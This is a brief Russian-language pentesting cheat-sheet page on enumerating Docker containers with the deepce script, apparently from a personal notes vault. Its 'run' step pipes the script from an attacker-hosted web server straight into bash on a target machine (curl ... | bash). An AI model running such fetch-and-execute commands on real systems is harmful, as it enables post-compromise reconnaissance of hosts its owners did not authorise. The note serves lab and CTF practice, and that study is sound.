# Перечисление Docker-контейнеров

## deepce

Deepce — это автоматизированное инструмент для перечисления, который может использоваться для сканирования docker-контейнеров, аналогично [[Linux Enumeration#Linpeas|Linpeas]].

### Настройка

Репозитор Git: [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)

Установка на хост-машине:

```bash
$ wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
```

### Запуск

Запустите [[Fundamental Skills#Python Webserver|Webсервер]] на хост-машине для выполнения скрипта.

На целевой машине:

```bash
$ curl http://[HOST_IP]:[SERVER_PORT]/deepce.sh | bash
```

### Практический пример

Laboratory Video от Ippsec [https://youtu.be/ozmHeApuSj8?t=1370]

# Теги

#cheat-sheet #enum #docker
